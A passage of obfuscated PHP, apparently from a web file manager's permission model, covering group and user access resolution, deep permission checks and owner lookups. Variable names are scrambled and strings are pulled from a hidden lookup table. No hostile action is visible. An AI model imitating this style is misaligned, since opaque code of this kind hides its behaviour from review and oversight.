$³°¾ËğÔ[$µ‹İÊçØ[513]] != $¨îî‹ì) { $‡­©Ö¹Î = $this->groupChidldAllRootSource($³°¾ËğÔ[$µ‹İÊçØ[513]]); } $Íû…½ô = $this->field($µ‹İÊçØ[410])->group($µ‹İÊçØ[410])->select(); $Íû…½ô = array_to_keyvalue($Íû…½ô, $µ‹İÊçØ[12], $µ‹İÊçØ[410]); if (!$Íû…½ô) { return array(); } $ÙÓ’Ä•å = $µ‹İÊçØ[2015]; $Ì¢„ÅÁ = array($µ‹İÊçØ[410] => array($µ‹İÊçØ[7], $Íû…½ô), $µ‹İÊçØ[439] => $µ‹İÊçØ[197]); $¿²Âãäñ = Model($µ‹İÊçØ[838])->field($ÙÓ’Ä•å)->where($Ì¢„ÅÁ)->select(); $Ëô ßÄ = array($éüü±¢Ğ); foreach ($¿²Âãäñ as $°¬½Ûñ) { foreach ($‡­©Ö¹Î as $¿î‹â¤²) { $±²¶×—‹ = $µ‹İÊçØ[50] . $¿î‹â¤² . $µ‹İÊçØ[50]; $¤“Š¿Ÿ— = $°¬½Ûñ[$µ‹İÊçØ[529]] . $°¬½Ûñ[$µ‹İÊçØ[410]] . $µ‹İÊçØ[50]; if (strstr($¤“Š¿Ÿ—, $±²¶×—‹)) { $Ëô ßÄ[] = $°¬½Ûñ[$µ‹İÊçØ[410]]; break; } } } return $this->sourceListAuth($Ëô ßÄ); } private function sourceListAuth($ŞŞÁı±œ) { $üÁÙ»‘Å =& $_SERVER[ Ö‘ñÄ”]; $´ì£Ê¼Û = Model($üÁÙ»‘Å[1333])->sourceListInfo($ŞŞÁı±œ, !0); $÷ºîË†Ù = $this->sourceAuthSelect($ŞŞÁı±œ); $ò«Õã¡“ = array(); $æãº÷õ„ = array(); foreach ($´ì£Ê¼Û as $ÏŞù«®) { unset($ÏŞù«®[$üÁÙ»‘Å[464]]); unset($ÏŞù«®[$üÁÙ»‘Å[462]]); unset($ÏŞù«®[$üÁÙ»‘Å[421]]); unset($ÏŞù«®[$üÁÙ»‘Å[86]]); $¾ºÕŠ‘Î = $÷ºîË†Ù[$ÏŞù«®[$üÁÙ»‘Å[410]]]; if (!$¾ºÕŠ‘Î) { continue; } $ÏŞù«®[$üÁÙ»‘Å[2016]] = $this->authTargetInfo($¾ºÕŠ‘Î); $ÏŞù«®[$üÁÙ»‘Å[527]] = rtrim($ÏŞù«®[$üÁÙ»‘Å[533]], $üÁÙ»‘Å[8]) . $üÁÙ»‘Å[8] . ltrim($ÏŞù«®[$üÁÙ»‘Å[527]], $üÁÙ»‘Å[8]); $ò«Õã¡“[] = $ÏŞù«®; $æñğŠ¿ = count(explode($üÁÙ»‘Å[8], trim($ÏŞù«®[$üÁÙ»‘Å[527]], $üÁÙ»‘Å[8]))); $æãº÷õ„[] = $æñğŠ¿ + ($ÏŞù«®[$üÁÙ»‘Å[33]] == $üÁÙ»‘Å[75] ? 0 : 1000); } array_multisort($æãº÷õ„, SORT_ASC, $ò«Õã¡“); return $ò«Õã¡“; } private function groupChidldAllRootSource($‹§Î »í) { $éç±ˆ» =& $_SERVER[ Ö‘ñÄ”]; $Ÿ¿¨¡Â‰ = Model($éç±ˆ»[2017])->groupChildrenAll($‹§Î »í); $…°ÁÌá« = array($éç±ˆ»[440] => 0, $éç±ˆ»[513] => array($éç±ˆ»[7], $Ÿ¿¨¡Â‰), $éç±ˆ»[419] => SourceModel::TYPE_GROUP); $¡°ğÉù = Model($éç±ˆ»[838])->field($éç±ˆ»[410])->where($…°ÁÌá«)->select(); $¡°ğÉù = array_to_keyvalue($¡°ğÉù, $éç±ˆ»[12], $éç±ˆ»[410]); return $¡°ğÉù; } private function authTargetInfo($¨ÂÁå€¸) { $ŒĞ³°ÛŞ =& $_SERVER[ Ö‘ñÄ”]; $ßë¨íÆ½ = array(); $ı‚ûÜé = array(); $—ƒ²¶æ = 2 << 25; foreach ($¨ÂÁå€¸ as $Ë’è§‰É) { $•Â²½ó´ = Model($ŒĞ³°ÛŞ[515])->listData($Ë’è§‰É[$ŒĞ³°ÛŞ[1940]]); if (!$•Â²½ó´) { continue; } if ($Ë’è§‰É[$ŒĞ³°ÛŞ[419]] == SourceModel::TYPE_USER) { $à¨ıÚ… = Model($ŒĞ³°ÛŞ[521])->getInfoSimpleOuter($Ë’è§‰É[$ŒĞ³°ÛŞ[513]]); if ($à¨ıÚ…[$ŒĞ³°ÛŞ[1663]] == $ŒĞ³°ÛŞ[1196]) { continue; } if ($à¨ıÚ…[$ŒĞ³°ÛŞ[1663]] == $ŒĞ³°ÛŞ[197]) { $à¨ıÚ…[$ŒĞ³°ÛŞ[32]] = LNG($ŒĞ³°ÛŞ[2018]); } } else { $à¨ıÚ… = Model($ŒĞ³°ÛŞ[530])->getInfoSimple($Ë’è§‰É[$ŒĞ³°ÛŞ[513]]); } if (!$à¨ıÚ…) { continue; } $à¨ıÚ…[$ŒĞ³°ÛŞ[475]] = $•Â²½ó´; $ßë¨íÆ½[] = $à¨ıÚ…; $·ÌİÜÉ = 0; if ($Ë’è§‰É[$ŒĞ³°ÛŞ[419]] == SourceModel::TYPE_GROUP) { $·ÌİÜÉ = $—ƒ²¶æ * 2; } if ($Ë’è§‰É[$ŒĞ³°ÛŞ[419]] == SourceModel::TYPE_USER) { $·ÌİÜÉ = $—ƒ²¶æ; } if ($Ë’è§‰É[$ŒĞ³°ÛŞ[419]] == SourceModel::TYPE_USER && $Ë’è§‰É[$ŒĞ³°ÛŞ[513]] == $ŒĞ³°ÛŞ[197]) { $·ÌİÜÉ = 0; } $ı‚ûÜé[] = $•Â²½ó´[$ŒĞ³°ÛŞ[421]] + $·ÌİÜÉ; } array_multisort($ı‚ûÜé, SORT_DESC, $ßë¨íÆ½); return $ßë¨íÆ½; } public function getAllChildrenByUser($Ù¿¿¿‡Ö, $ĞÒşş×·) { $ ÕĞãé =& $_SERVER[ Ö‘ñÄ”]; $’è÷½Ô = Model($ ÕĞãé[543])->getInfo($ĞÒşş×·); if (!$ĞÒşş×· || !$Ù¿¿¿‡Ö || !$’è÷½Ô) { return array(); } $ù¡Ä‚¬á = Model($ ÕĞãé[1333])->sourceInfo($Ù¿¿¿‡Ö); $íÍºóğæ = array(); $À¸ª›¸ = 1; if ($ù¡Ä‚¬á[$ ÕĞãé[440]] == $ ÕĞãé[197] && $ù¡Ä‚¬á[$ ÕĞãé[513]] != $À¸ª›¸ && $this->groupContainUser($ù¡Ä‚¬á[$ ÕĞãé[513]], $ĞÒşş×·)) { foreach ($’è÷½Ô[$ ÕĞãé[2019]] as $‚µí·ä·) { $¬ÏµÓ°à = Model($ ÕĞãé[530])->getInfo($‚µí·ä·[$ ÕĞãé[1836]]); $¿‡åÏ‘û = Model($ ÕĞãé[543])->getInfoSimpleOuter($ĞÒşş×·); $¿‡åÏ‘û[$ ÕĞãé[475]] = $‚µí·ä·[$ ÕĞãé[421]]; if (Model($ ÕĞãé[515])->authCheckAction($‚µí·ä·[$ ÕĞãé[421]][$ ÕĞãé[421]], $ ÕĞãé[1857])) { continue; } $—²Ãï‡š = array($ ÕĞãé[32] => $ ÕĞãé[1611] . $¬ÏµÓ°à[$ ÕĞãé[32]], $ ÕĞãé[410] => $¬ÏµÓ°à[$ ÕĞãé[86]][$ ÕĞãé[410]], $ ÕĞãé[84] => KodIO::make($¬ÏµÓ°à[$ ÕĞãé[86]][$ ÕĞãé[410]]), $ ÕĞãé[440] => $ ÕĞãé[197], $ ÕĞãé[419] => $ ÕĞãé[523], $ ÕĞãé[33] => $ ÕĞãé[562], $ ÕĞãé[527] => $¬ÏµÓ°à[$ ÕĞãé[534]], $ ÕĞãé[1836] => $¬ÏµÓ°à[$ ÕĞãé[1836]], $ ÕĞãé[531] => $¬ÏµÓ°à[$ ÕĞãé[440]], $ ÕĞãé[2016] => array($¿‡åÏ‘û)); $íÍºóğæ[$—²Ãï‡š[$ ÕĞãé[410]]] = $—²Ãï‡š; } } $²öÍƒ×« = array(); $÷ş¥ü = $this->getAllChildren($Ù¿¿¿‡Ö); foreach ($÷ş¥ü as $Ë¼ÀĞ—) { $¶¤±ß = !1; foreach ($Ë¼ÀĞ—[$ ÕĞãé[2016]] as $ÖÒ€Ü³¢) { if ($ÖÒ€Ü³¢[$ ÕĞãé[1663]]) { if ($ÖÒ€Ü³¢[$ ÕĞãé[1663]] == $ĞÒşş×·) { $¶¤±ß = !0; break; } } if ($ÖÒ€Ü³¢[$ ÕĞãé[1836]]) { if ($this->groupContainUser($ÖÒ€Ü³¢[$ ÕĞãé[1836]], $ĞÒşş×·)) { $¶¤±ß = !0; break; } } } if ($¶¤±ß) { $²öÍƒ×«[] = $Ë¼ÀĞ—; } $òêôŠàÎ = $Ë¼ÀĞ—[$ ÕĞãé[410]]; if (isset($íÍºóğæ[$òêôŠàÎ])) { $Ë¼ÀĞ—[$ ÕĞãé[2016]][] = $íÍºóğæ[$òêôŠàÎ][0]; $íÍºóğæ[$òêôŠàÎ] = !1; } } $íÍºóğæ = array_filter(array_values($íÍºóğæ)); $²öÍƒ×« = array_merge($íÍºóğæ, $²öÍƒ×«); return $²öÍƒ×«; } public function setAllChildrenByUser($ñãèè‘, $†ğé°Î, $»©Ğš¦Ì) { $ËÖ«–ô‘ =& $_SERVER[ Ö‘ñÄ”]; $š¡øĞ¦¶ = $this->getAllChildrenByUser($ñãèè‘, $†ğé°Î); if (!$»©Ğš¦Ì || !$š¡øĞ¦¶) { return !1; } foreach ($š¡øĞ¦¶ as $ıŞ¬œØ») { $¸¯ŞéÄ = array(); foreach ($ıŞ¬œØ»[$ËÖ«–ô‘[2016]] as $ä™ª®Ø) { $ã’«şœø = $ä™ª®Ø[$ËÖ«–ô‘[475]]; $øá…õ›Ò = $ä™ª®Ø[$ËÖ«–ô‘[1663]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $È»‡ÙÖ• = $ä™ª®Ø[$ËÖ«–ô‘[1663]] ? $ä™ª®Ø[$ËÖ«–ô‘[1663]] : $ä™ª®Ø[$ËÖ«–ô‘[1836]]; if ($ä™ª®Ø[$ËÖ«–ô‘[1663]] && $ä™ª®Ø[$ËÖ«–ô‘[1663]] == $†ğé°Î) { continue; } $¸¯ŞéÄ[] = array($ËÖ«–ô‘[410] => $ıŞ¬œØ»[$ËÖ«–ô‘[410]], $ËÖ«–ô‘[419] => $øá…õ›Ò, $ËÖ«–ô‘[513] => intval($È»‡ÙÖ•), $ËÖ«–ô‘[1940] => isset($ã’«şœø[$ËÖ«–ô‘[407]]) ? intval($ã’«şœø[$ËÖ«–ô‘[407]]) : 0, $ËÖ«–ô‘[1996] => isset($ã’«şœø[$ËÖ«–ô‘[1996]]) ? intval($ã’«şœø[$ËÖ«–ô‘[1996]]) : -1); } $¸¯ŞéÄ[] = array($ËÖ«–ô‘[410] => $ıŞ¬œØ»[$ËÖ«–ô‘[410]], $ËÖ«–ô‘[419] => SourceModel::TYPE_USER, $ËÖ«–ô‘[513] => intval($†ğé°Î), $ËÖ«–ô‘[1940] => intval($»©Ğš¦Ì), $ËÖ«–ô‘[1996] => -1); $this->where(array($ËÖ«–ô‘[425] => $ıŞ¬œØ»[$ËÖ«–ô‘[410]]))->delete(); $this->addAll($¸¯ŞéÄ); } return !0; } public function get($ªØæÅ›ƒ) { $ı»“‹óÛ = $this->getSourceList(array($ªØæÅ›ƒ), !0); return $ı»“‹óÛ[0]; } public function getSourceList($ØÈŸÍñ, $½ÁŠ·á = false, $öêìíç = false) { $ã¥œßÂ¹ =& $_SERVER[ Ö‘ñÄ”]; if (!$ØÈŸÍñ) { return array(); } $·ÈÌ±£… = Model($ã¥œßÂ¹[1333]); if (!$½ÁŠ·á && count($ØÈŸÍñ) == 1) { $½ÁŠ·á = array(); $½ÁŠ·á[$ØÈŸÍñ[0]] = $·ÈÌ±£…->sourceInfo($ØÈŸÍñ[0]); } if (!$½ÁŠ·á) { $±™ï×ŞÏ = array($ã¥œßÂ¹[425] => array($ã¥œßÂ¹[426], $ØÈŸÍñ)); $½ÁŠ·á = $·ÈÌ±£…->field($ã¥œßÂ¹[2020])->where($±™ï×ŞÏ)->select(); $½ÁŠ·á = array_to_keyvalue($½ÁŠ·á, $ã¥œßÂ¹[410]); } $ê²çåŠ‚ = $ØÈŸÍñ; foreach ($½ÁŠ·á as $æµ¯µä‚ => $‘‚ÙË¿„) { $¯¼îƒ”ê = $·ÈÌ±£…->parentLevelArray($‘‚ÙË¿„[$ã¥œßÂ¹[529]]); $ê²çåŠ‚ = array_merge($ê²çåŠ‚, array($æµ¯µä‚), array_reverse($¯¼îƒ”ê)); } $ê²çåŠ‚ = array_values(array_unique($ê²çåŠ‚)); if (!$ê²çåŠ‚) { return array(); } $åîäÅšÛ = $this->sourceAuthSelect($ê²çåŠ‚); $³ñÜÂåÅ = array(); foreach ($ê²çåŠ‚ as $¬Ú²ùğ›) { if (isset($åîäÅšÛ[$¬Ú²ùğ›])) { $³ñÜÂåÅ[$¬Ú²ùğ›] = $åîäÅšÛ[$¬Ú²ùğ›]; } } $ó²âÑ = $this->userIsRoot($öêìíç); $¬¿¹ç¤ = AuthModel::authAll(); $ÍÇŠÂ¼¢ = array($ã¥œßÂ¹[422] => $¬¿¹ç¤, $ã¥œßÂ¹[2021] => array($ã¥œßÂ¹[427] => 0, $ã¥œßÂ¹[1842] => $¬¿¹ç¤, $ã¥œßÂ¹[428] => LNG($ã¥œßÂ¹[2022]), $ã¥œßÂ¹[1859] => $ã¥œßÂ¹[2023])); $‡¦Ÿ‘ƒÄ = array(); foreach ($½ÁŠ·á as $¬Ú²ùğ› => $˜§”¿) { if ($ó²âÑ && $GLOBALS[$ã¥œßÂ¹[6]][$ã¥œßÂ¹[1855]]) { $‡¦Ÿ‘ƒÄ[$¬Ú²ùğ›] = $ÍÇŠÂ¼¢; continue; } $‡¦Ÿ‘ƒÄ[$¬Ú²ùğ›] = $this->makeSourceAuth($˜§”¿, $³ñÜÂåÅ, $öêìíç); } return $‡¦Ÿ‘ƒÄ; } public function authDeepCheck($„´¬¿Ğš, $µ¸©öö = false) { $´ÁÌ¸¥® =& $_SERVER[ Ö‘ñÄ”]; $µ¸©öö = $µ¸©öö ? $µ¸©öö : USER_ID; $‹‘Í“î = $this->makeAuthDeep($µ¸©öö); if (!in_array($„´¬¿Ğš, $‹‘Í“î[$´ÁÌ¸¥®[2024]])) { return !1; } $ç®ÌœËí = array(); foreach ($‹‘Í“î[$´ÁÌ¸¥®[2025]] as $õ€ıÌÉ„ => $µ…ëéÏğ) { if (!in_array($„´¬¿Ğš, $µ…ëéÏğ)) { continue; } $ç®ÌœËí[] = $õ€ıÌÉ„; } if (!$ç®ÌœËí) { return !1; } $ïÌÍåé¹ = $ç®ÌœËí ? $ç®ÌœËí[0] : $„´¬¿Ğš; return array($´ÁÌ¸¥®[422] => -1, $´ÁÌ¸¥®[475] => array($´ÁÌ¸¥®[427] => $´ÁÌ¸¥®[1196], $´ÁÌ¸¥®[1842] => $´ÁÌ¸¥®[197], $´ÁÌ¸¥®[428] => LNG($´ÁÌ¸¥®[2026]), $´ÁÌ¸¥®[1859] => $´ÁÌ¸¥®[2027]), $´ÁÌ¸¥®[2028] => LNG($´ÁÌ¸¥®[2029]), $´ÁÌ¸¥®[2030] => $this->sourceAuthInfo($ïÌÍåé¹)); } protected function makeAuthDeep($ø›ÇÊòı = false) { $Úâ¨Ôü =& $_SERVER[ Ö‘ñÄ”]; static $¬çÔà‹ª = array(); $ø›ÇÊòı = $ø›ÇÊòı ? $ø›ÇÊòı : USER_ID; if (isset($¬çÔà‹ª[$ø›ÇÊòı])) { return $¬çÔà‹ª[$ø›ÇÊòı]; } $Ñ…¥ªØ = Model($Úâ¨Ôü[2031])->listData(); $Àœ³¹ = array(); foreach ($Ñ…¥ªØ as $¦„¡ÜÇş) { if ($¦„¡ÜÇş[$Úâ¨Ôü[421]] == 0 && $¦„¡ÜÇş[$Úâ¨Ôü[1858]] == $Úâ¨Ôü[88]) { $Àœ³¹[] = $¦„¡ÜÇş[$Úâ¨Ôü[407]]; } } $•…Ãµ•Ç = $this->userGroupParents($ø›ÇÊòı); $üÁû—Ÿ = array($Úâ¨Ôü[419] => SourceModel::TYPE_USER, $Úâ¨Ôü[513] => $ø›ÇÊòı); if ($•…Ãµ•Ç) { $üÁû—Ÿ = array(array($Úâ¨Ôü[419] => SourceModel::TYPE_USER, $Úâ¨Ôü[513] => $ø›ÇÊòı), array($Úâ¨Ôü[419] => SourceModel::TYPE_GROUP, $Úâ¨Ôü[513] => array($Úâ¨Ôü[426], $•…Ãµ•Ç)), $Úâ¨Ôü[1006] => $Úâ¨Ôü[1934]); } $†ü°ÙÍ° = $this->field($Úâ¨Ôü[2032])->where($üÁû—Ÿ)->select(); $âò¿›ó¬ = array(); $·êı„áû = array_to_keyvalue_group($†ü°ÙÍ°, $Úâ¨Ôü[410]); foreach ($·êı„áû as $Ç´“áÈ• => $ıååğÕ) { $¨Ææ³‚Ï = $this->authArrayCheck($ıååğÕ, $ø›ÇÊòı); if ($¨Ææ³‚Ï[$Úâ¨Ôü[422]] > 0) { $âò¿›ó¬[] = $Ç´“áÈ• . $Úâ¨Ôü[12]; } } if ($•…Ãµ•Ç) { $üäŠÓñ = Model($Úâ¨Ôü[530]); foreach ($•…Ãµ•Ç as $ÖÁ„ó­±) { $†ôÎ¼½Ü = $üäŠÓñ->getInfo($ÖÁ„ó­±); if (!$†ôÎ¼½Ü || !is_array($†ôÎ¼½Ü[$Úâ¨Ôü[86]])) { continue; } $âò¿›ó¬[] = $†ôÎ¼½Ü[$Úâ¨Ôü[86]][$Úâ¨Ôü[410]]; } } $×êÅ¥ƒ = array(); $ ÑÖ™Ùö = $•…Ãµ•Ç; $‘ğø¸‡‚ = Model($Úâ¨Ôü[1333]); $üäŠÓñ = Model($Úâ¨Ôü[530]); $õ›•‰×è = array(); $‡ø›¢—ü = array(); $Ö¡ï¨› = array(); $Ùıœ¹¯ = array(); if ($âò¿›ó¬) { $ÅƒÁÜˆ» = $‘ğø¸‡‚->where(array($Úâ¨Ôü[410] => array($Úâ¨Ôü[426], $âò¿›ó¬)))->select(); foreach ($ÅƒÁÜˆ» as $Ÿ‹íõıú) { $÷Í“¯äº = $‘ğø¸‡‚->parentLevelArray($Ÿ‹íõıú[$Úâ¨Ôü[529]]); $×êÅ¥ƒ = array_merge($×êÅ¥ƒ, $÷Í“¯äº); $ ÑÖ™Ùö[] = $Ÿ‹íõıú[$Úâ¨Ôü[513]]; $õ›•‰×è[$Ÿ‹íõıú[$Úâ¨Ôü[410]]] = $÷Í“¯äº; $‡ø›¢—ü[$Ÿ‹íõıú[$Úâ¨Ôü[410]]] = $Ÿ‹íõıú[$Úâ¨Ôü[513]]; } } $ ÑÖ™Ùö = array_values(array_unique($ ÑÖ™Ùö)); $ÈÁş³ê‘ = $ ÑÖ™Ùö; foreach ($ÈÁş³ê‘ as $ÖÁ„ó­±) { $†ôÎ¼½Ü = $üäŠÓñ->getInfo($ÖÁ„ó­±); $÷Í“¯äº = $‘ğø¸‡‚->parentLevelArray($†ôÎ¼½Ü[$Úâ¨Ôü[529]]); $ ÑÖ™Ùö = array_merge($ ÑÖ™Ùö, $÷Í“¯äº); } $ ÑÖ™Ùö = array_values(array_unique($ ÑÖ™Ùö)); foreach ($ ÑÖ™Ùö as $ÖÁ„ó­±) { $†ôÎ¼½Ü = $üäŠÓñ->getInfo($ÖÁ„ó­±); $×êÅ¥ƒ[] = $†ôÎ¼½Ü[$Úâ¨Ôü[86]][$Úâ¨Ôü[410]]; $Ö¡ï¨›[$ÖÁ„ó­±] = $†ôÎ¼½Ü[$Úâ¨Ôü[86]][$Úâ¨Ôü[410]]; $Ùıœ¹¯[$ÖÁ„ó­±] = $‘ğø¸‡‚->parentLevelArray($†ôÎ¼½Ü[$Úâ¨Ôü[529]]); } foreach ($õ›•‰×è as $ÕÉŠıçÉ => $ø”øìßö) { $òíâ¥‹£ = $‡ø›¢—ü[$ÕÉŠıçÉ]; if (!$òíâ¥‹£ || !$Ö¡ï¨›[$òíâ¥‹£]) { continue; } $Ñî˜ğœ = array(); foreach ($Ùıœ¹¯[$òíâ¥‹£] as $ÖÁ„ó­±) { $Ñî˜ğœ[] = $Ö¡ï¨›[$ÖÁ„ó­±]; } $õ›•‰×è[$ÕÉŠıçÉ] = array_merge($Ñî˜ğœ, $ø”øìßö); } $×êÅ¥ƒ = array_values(array_unique($×êÅ¥ƒ)); $üƒ ­¥Ò = array($Úâ¨Ôü[2024] => $×êÅ¥ƒ, $Úâ¨Ôü[2025] => $õ›•‰×è); $¬çÔà‹ª[$ø›ÇÊòı] = $üƒ ­¥Ò; return $üƒ ­¥Ò; } private function makeSourceAuth($Û‹™Öò‰, $ú‹’²ñÍ, $¯š›ÇÎ„ = false) { $©ü¨ößÔ =& $_SERVER[ Ö‘ñÄ”]; $Û®½Ö×à = $©ü¨ößÔ[88]; $Ëàêß± = $Û‹™Öò‰[$©ü¨ößÔ[513]]; $›¨Ö”ëØ = $Û‹™Öò‰[$©ü¨ößÔ[419]] == SourceModel::TYPE_GROUP; $®€İíªû = $›¨Ö”ëØ ? $this->groupRootAuth($Ëàêß±, $¯š›ÇÎ„) : !1; if ($®€İíªû && Model($©ü¨ößÔ[515])->authCheckAction($®€İíªû[$©ü¨ößÔ[421]], $©ü¨ößÔ[1857])) { return $this->groupAuthInfo($®€İíªû, $Ëàêß±); } $Ìõóå = Model($©ü¨ößÔ[1333])->parentLevelArray($Û‹™Öò‰[$©ü¨ößÔ[529]]); $Ìõóå = array_merge(array($Û‹™Öò‰[$©ü¨ößÔ[410]]), array_reverse($Ìõóå)); $§¯¶±ö² = !1; foreach ($Ìõóå as $í¹×™–) { if (!isset($ú‹’²ñÍ[$í¹×™–])) { continue; } $¼áÍ„ = $this->authMake($ú‹’²ñÍ[$í¹×™–], $¯š›ÇÎ„); if ($¼áÍ„[$©ü¨ößÔ[475]]) { $§¯¶±ö² = $¼áÍ„; break; } } if (!$›¨Ö”ëØ) { return $§¯¶±ö²; } if (!$§¯¶±ö² && $®€İíªû) { $§¯¶±ö² = $this->groupAuthInfo($®€İíªû, $Ëàêß±); } if (!$§¯¶±ö²) { $õ…í¥ÌÕ = Model($©ü¨ößÔ[530])->getInfo($Ëàêß±); $ÏŞŞ×ˆº = explode($©ü¨ößÔ[50], trim($õ…í¥ÌÕ[$©ü¨ößÔ[529]], $©ü¨ößÔ[50])); $ÏŞŞ×ˆº = array_reverse($ÏŞŞ×ˆº); foreach ($ÏŞŞ×ˆº as $®ÃãÆã´) { if ($®ÃãÆã´ == $©ü¨ößÔ[197] || $®ÃãÆã´ == $Û®½Ö×à) { continue; } $­¼Ÿ„¼· = $this->groupRootAuth($®ÃãÆã´, $¯š›ÇÎ„); if (!$­¼Ÿ„¼·) { continue; } $§¯¶±ö² = $this->groupAuthInfo($­¼Ÿ„¼·, $®ÃãÆã´); break; } } if (!$§¯¶±ö² || $§¯¶±ö²[$©ü¨ößÔ[422]] <= 0) { $¨À¬®å¨ = $this->authDeepCheck($Û‹™Öò‰[$©ü¨ößÔ[410]], $¯š›ÇÎ„); if ($¨À¬®å¨) { $§¯¶±ö² = $¨À¬®å¨; } } return $§¯¶±ö²; } private function userIsRoot($éëºÀ‹Ğ = false) { $ÕáÇ¨Ûà =& $_SERVER[ Ö‘ñÄ”]; if (!$éëºÀ‹Ğ && _get($GLOBALS, $ÕáÇ¨Ûà[511])) { return !0; } $±³”¬û = Model($ÕáÇ¨Ûà[543])->getInfo($éëºÀ‹Ğ); $ŒäàİÏ = Model($ÕáÇ¨Ûà[2033])->listData($±³”¬û[$ÕáÇ¨Ûà[1542]]); if ($ŒäàİÏ && $ŒäàİÏ[$ÕáÇ¨Ûà[519]][$ÕáÇ¨Ûà[2034]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‚ÂÅãœ) { $©—üé‰ =& $_SERVER[ Ö‘ñÄ”]; $†¬²ïıÉ = Model($©—üé‰[1333]); $¿ç«­½ş = $†¬²ïıÉ->sourceInfo($‚ÂÅãœ); if (!$¿ç«­½ş) { return !1; } $†¬²ïıÉ->groupPathDisplay($¿ç«­½ş); $”îÈˆÚÂ = array($¿ç«­½ş); $”îÈˆÚÂ = $†¬²ïıÉ->_listAppendPath($”îÈˆÚÂ); $¿ç«­½ş = $”îÈˆÚÂ[0]; $ñï¿¦†ü = $¿ç«­½ş[$©—üé‰[527]]; if (isset($¿ç«­½ş[$©—üé‰[535]])) { $÷Åù•Ëü = explode($©—üé‰[8], trim($¿ç«­½ş[$©—üé‰[527]], $©—üé‰[8])); array_shift($÷Åù•Ëü); $ñï¿¦†ü = $¿ç«­½ş[$©—üé‰[533]] . $©—üé‰[2035] . implode($©—üé‰[8], $÷Åù•Ëü); } return array($©—üé‰[428] => $¿ç«­½ş[$©—üé‰[32]], $©—üé‰[84] => KodIO::make($¿ç«­½ş[$©—üé‰[410]]), $©—üé‰[2036] => $ñï¿¦†ü); } private function groupAuthInfo($§™ÍÇÏ‰, $ÅÑæÀû²) { $ù·¤µ©œ =& $_SERVER[ Ö‘ñÄ”]; $œã³ƒÈÛ = Model($ù·¤µ©œ[530])->getInfo($ÅÑæÀû²); return array($ù·¤µ©œ[2037] => intval($§™ÍÇÏ‰[$ù·¤µ©œ[421]]), $ù·¤µ©œ[2021] => $§™ÍÇÏ‰, $ù·¤µ©œ[2038] => LNG($ù·¤µ©œ[2039]), $ù·¤µ©œ[2030] => array($ù·¤µ©œ[428] => $œã³ƒÈÛ[$ù·¤µ©œ[32]], $ù·¤µ©œ[84] => KodIO::make($œã³ƒÈÛ[$ù·¤µ©œ[86]][$ù·¤µ©œ[410]]), $ù·¤µ©œ[2036] => $œã³ƒÈÛ[$ù·¤µ©œ[534]])); } protected function groupRootAuth($¥´Ä¶†´, $Ô›ÇËõ¹ = false) { $ÊµËñŒÖ =& $_SERVER[ Ö‘ñÄ”]; $Ô›ÇËõ¹ = $Ô›ÇËõ¹ ? $Ô›ÇËõ¹ : USER_ID; $ÜÉÀÖÌè = $Ô›ÇËõ¹ . $ÊµËñŒÖ[2040] . $¥´Ä¶†´; static $…Š™‚òŸ = array(); if (isset($…Š™‚òŸ[$ÜÉÀÖÌè])) { return $…Š™‚òŸ[$ÜÉÀÖÌè]; } $­šçĞú¡ = Model($ÊµËñŒÖ[530])->getInfo($¥´Ä¶†´); $ Ó¸êü² = $this->userGroupList($Ô›ÇËõ¹); $Ê“§— = isset($ Ó¸êü²[$¥´Ä¶†´]) ? $ Ó¸êü²[$¥´Ä¶†´][$ÊµËñŒÖ[421]] : !1; if ($Ê“§— && Model($ÊµËñŒÖ[515])->authCheckAction($Ê“§—[$ÊµËñŒÖ[421]], $ÊµËñŒÖ[1857])) { $…Š™‚òŸ[$ÜÉÀÖÌè] = $Ê“§—; return $Ê“§—; } $”ßàüÂä = $this->sourceAuthSelect($­šçĞú¡[$ÊµËñŒÖ[86]][$ÊµËñŒÖ[410]]); $•µ†Š÷ = $”ßàüÂä ? $this->authMake($”ßàüÂä, $Ô›ÇËõ¹) : !1; $‚õÕ÷ë = $•µ†Š÷ ? $•µ†Š÷[$ÊµËñŒÖ[475]] : !1; $…Š™‚òŸ[$ÜÉÀÖÌè] = $‚õÕ÷ë ? $‚õÕ÷ë : $Ê“§—; return $…Š™‚òŸ[$ÜÉÀÖÌè]; } public function authOwnerApply($ùÖ£Óü¢) { $¬—ùÖŒ =& $_SERVER[ Ö‘ñÄ”]; if (empty($ùÖ£Óü¢[$¬—ùÖŒ[421]]) || isset($ùÖ£Óü¢[$¬—ùÖŒ[2041]]) && $ùÖ£Óü¢[$¬—ùÖŒ[2041]]) { return $ùÖ£Óü¢; } if (AuthModel::authCheckRoot($ùÖ£Óü¢[$¬—ùÖŒ[421]][$¬—ùÖŒ[422]])) { return $ùÖ£Óü¢; } $ÎÕßßÁ = Model($¬—ùÖŒ[1333])->parentLevelArray($ùÖ£Óü¢[$¬—ùÖŒ[529]]); $ÎÕßßÁ = array_merge(array($ùÖ£Óü¢[$¬—ùÖŒ[410]]), array_reverse($ÎÕßßÁ)); $ãï´Ú¶ = $this->sourceAuthSelect($ÎÕßßÁ); $›ÕìíÍ¼ = array(); $ÍÎÓ—Šú = array(); foreach ($ãï´Ú¶ as $©ûƒß‡‡ => $óû†’“ì) { $¤÷½¹È = $this->authFolderOwnerUser($óû†’“ì); $›ÕìíÍ¼[$©ûƒß‡‡] = $¤÷½¹È; $ÍÎÓ—Šú = array_merge($ÍÎÓ—Šú, $¤÷½¹È[$¬—ùÖŒ[608]]); if ($¤÷½¹È[$¬—ùÖŒ[2042]]) { break; } } if (count($ÍÎÓ—Šú) == 0) { $ÍÎÓ—Šú = $this->authFolderOwnerGroup($ùÖ£Óü¢[$¬—ùÖŒ[513]]); } $ÍÎÓ—Šú = array_unique($ÍÎÓ—Šú); if (AuthModel::authCheckRoot($ùÖ£Óü¢[$¬—ùÖŒ[421]][$¬—ùÖŒ[422]])) { $ÍÎÓ—Šú[] = USER_ID; } $ùÖ£Óü¢[$¬—ùÖŒ[421]][$¬—ùÖŒ[2043]] = Model($¬—ùÖŒ[521])->userListInfo($ÍÎÓ—Šú); return $ùÖ£Óü¢; } private function authFolderOwnerGroup($Äè•¿±í) { $ì¬îÜ« =& $_SERVER[ Ö‘ñÄ”]; $øÒÑØúë = Model($ì¬îÜ«[1926])->where(array($ì¬îÜ«[1836] => $Äè•¿±í))->select(); $£ßüÈìı = array(); if (!$øÒÑØúë) { return $£ßüÈìı; } foreach ($øÒÑØúë as $–Ì€ø˜é) { $ÊÛ˜•öê = $this->authInfo($–Ì€ø˜é); if 